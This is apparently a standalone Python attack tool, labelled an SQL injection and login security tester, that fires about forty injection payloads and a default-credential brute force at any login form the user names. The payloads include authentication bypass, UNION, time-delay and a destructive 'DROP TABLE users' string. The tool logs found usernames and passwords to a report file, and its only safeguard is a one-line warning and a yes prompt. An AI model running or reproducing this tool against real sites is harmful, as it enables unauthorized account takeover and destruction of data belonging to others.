#!/usr/bin/env python3

import requests
import time
import sys
import os
from datetime import datetime

print("""
╔═══════════════════════════════════════════════════════════╗
║  EQL - SQL INJECTION & LOGIN SECURITY TESTER v3.0        ║
║  Developer: @ERROR0101risback                            ║
║  Warning: Unauthorized testing is illegal                ║
╚═══════════════════════════════════════════════════════════╝
""")

resp = input("Accept terms? (yes/no): ")
if resp.lower() != 'yes':
    print("Exiting...")
    sys.exit(0)

class EQL:
    def __init__(self):
        self.vulns = []
        self.creds = []
        self.failure_keywords = []
        self.payloads = [
            "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1' /*", "' OR 1=1 --",
            "' OR 1=1 #", "' OR 1=1 /*", "' OR 'x'='x", "admin' --", "admin' #",
            "admin' /*", "' UNION SELECT 1,2,3 --", "' UNION SELECT 1,2,3,4,5 --",
            "' AND 1=1 --", "' AND SLEEP(5) --", "' OR SLEEP(5) --", "admin' OR '1'='1' --",
            "admin' OR 1=1 --", "' OR 1=1 LIMIT 1 --", "' OR '1'='1' LIMIT 1 --",
            "' OR EXISTS(SELECT * FROM users) --", "'; SELECT * FROM users --",
            "admin' AND 1=1 --", "admin' AND SLEEP(3) --", "' OR '1'='1' AND SLEEP(3) --",
            "admin' OR 'a'='a", "1' OR '1'='1", "' OR username='admin' --",
            "admin'-- -", "admin'#", "admin'/**/", "' UNION SELECT NULL,NULL,NULL,NULL --",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --", "'; DROP TABLE users; --",
            "admin' OR '1'='1'#", "admin' OR '1'='1'/*", "' OR '1'='1'#", "' OR '1'='1'/*",
            "1' OR 1=1#", "1' OR 1=1/*", "' OR 1=1 ORDER BY 1--", "' OR 1=1 ORDER BY 2--"
        ]

    def get_keywords(self):
        print("\n" + "="*60)
        print("LOGIN RESPONSE DETECTION SETUP")
        print("="*60)
        print("\nEnter keywords that appear when login FAILS:")
        print("(If these keywords are NOT found on page, login will be considered SUCCESSFUL)")
        fail = input("Failure keywords (comma separated): ")
        self.failure_keywords = [k.strip().lower() for k in fail.split(',') if k.strip()]
        
        if not self.failure_keywords:
            self.failure_keywords = ["invalid", "incorrect", "failed", "error"]
            print(f"[!] Using default failure keywords: {self.failure_keywords}")

    def preset_usernames(self):
        return ["admin", "Administrator", "root", "user", "test", "guest", "admin1", 
                "webadmin", "sysadmin", "manager", "support", "info", "contact", 
                "webmaster", "operator", "superuser", "supervisor", "owner", "master"]

    def preset_passwords(self):
        return ["admin", "password", "123456", "12345678", "1234", "qwerty", "abc123", 
                "admin123", "root", "letmein", "welcome", "passw0rd", "password123", 
                "admin@123", "admin#123", "123456789", "12345", "111111", "adminadmin"]

    def get_wordlist(self, wtype):
        print(f"\n--- {wtype} List ---")
        print("1. Use preset list")
        print("2. Use custom file path")
        ch = input("Select (1/2): ")
        if ch == '2':
            path = input(f"Enter path to {wtype.lower()} file: ")
            if os.path.exists(path):
                with open(path, 'r') as f:
                    return [line.strip() for line in f if line.strip()]
        if wtype == "Username":
            return self.preset_usernames()
        else:
            return self.preset_passwords()

    def test_login(self, url, user, pwd, uf, pf, sf):
        try:
            data = {uf: user, pf: pwd, sf: "Login"}
            start = time.time()
            r = requests.post(url, data=data, timeout=10, allow_redirects=True)
            elapsed = time.time() - start
            content = r.text.lower()
            final_url = r.url.lower()
            
            if r.status_code == 302 and "login" not in final_url:
                return True, elapsed, "Redirect detected"
            
            if elapsed > 4:
                return True, elapsed, "Time delay detected"
            
            for kw in self.failure_keywords:
                if kw in content or kw in final_url:
                    return False, elapsed, f"Failure keyword found: {kw}"
            
            return True, elapsed, "No failure message found"
            
        except Exception as e:
            return False, 0, f"Connection error: {str(e)[:30]}"

    def sql_test(self, url, uf, pf, sf):
        print("\n" + "="*60)
        print("SQL INJECTION TESTING")
        print("="*60)
        for i, p in enumerate(self.payloads, 1):
            print(f"[{i}/{len(self.payloads)}] Testing: {p[:40]}...")
            success, elapsed, msg = self.test_login(url, p, "x", uf, pf, sf)
            if success:
                print(f"    [!] VULNERABLE! {msg} ({elapsed:.2f}s)")
                self.vulns.append({"payload": p, "response": msg, "time": f"{elapsed:.2f}s"})
            else:
                print(f"    [.] Not vulnerable - {msg}")
            time.sleep(0.3)
        return self.vulns

    def brute_test(self, url, uf, pf, sf, users, passes):
        print("\n" + "="*60)
        print("BRUTE FORCE TESTING")
        print("="*60)
        total = len(users) * len(passes)
        curr = 0
        for user in users:
            for pwd in passes:
                curr += 1
                print(f"[{curr}/{total}] Testing: {user}:{pwd}")
                success, elapsed, msg = self.test_login(url, user, pwd, uf, pf, sf)
                if success:
                    print(f"    [!!!] FOUND! {user}:{pwd} - {msg}")
                    self.creds.append({"username": user, "password": pwd, "response": msg})
                time.sleep(0.2)
        return self.creds

    def save_report(self):
        with open("scan.txt", 'w') as f:
            f.write("="*80 + "\n")
            f.write(f"EQL SCAN REPORT - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*80 + "\n\n")
            f.write(f"Failure Keywords: {', '.join(self.failure_keywords)}\n")
            f.write("Detection Logic: If failure keywords NOT found → SUCCESS\n\n")
            f.write("SQL INJECTION VULNERABILITIES:\n")
            f.write("-"*60 + "\n")
            if self.vulns:
                for v in self.vulns:
                    f.write(f"Payload: {v['payload']}\n")
                    f.write(f"Indicator: {v['response']}\n")
                    f.write(f"Time: {v['time']}\n\n")
            else:
                f.write("None found.\n\n")
            f.write("VALID CREDENTIALS:\n")
            f.write("-"*60 + "\n")
            if self.creds:
                for c in self.creds:
                    f.write(f"Username: {c['username']}\n")
                    f.write(f"Password: {c['password']}\n")
                    f.write(f"Response: {c['response']}\n\n")
            else:
                f.write("None found.\n\n")
            f.write("="*80 + "\n")
        print(f"\n[+] Report saved to scan.txt")

    def run(self):
        print("\n[+] Enter target information")
        url = input("Login URL: ")
        uf = input("Username field name: ")
        pf = input("Password field name: ")
        sf = input("Submit button name: ")
        
        self.get_keywords()
        
        print("\n[+] Select testing mode")
        print("1. SQL Injection Only")
        print("2. Brute Force Only")
        print("3. Full Test (Both)")
        mode = input("Mode (1/2/3): ")
        
        users = []
        passes = []
        if mode in ['2', '3']:
            users = self.get_wordlist("Username")
            passes = self.get_wordlist("Password")
            print(f"[+] Loaded {len(users)} usernames, {len(passes)} passwords")
        
        if mode in ['1', '3']:
            self.sql_test(url, uf, pf, sf)
        
        if mode in ['2', '3']:
            self.brute_test(url, uf, pf, sf, users, passes)
        
        self.save_report()
        
        print("\n" + "="*60)
        print("SCAN COMPLETE")
        print("="*60)
        print(f"SQL Injection Findings: {len(self.vulns)}")
        print(f"Valid Credentials Found: {len(self.creds)}")
        print("="*60)

if __name__ == "__main__":
    try:
        tool = EQL()
        tool.run()
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)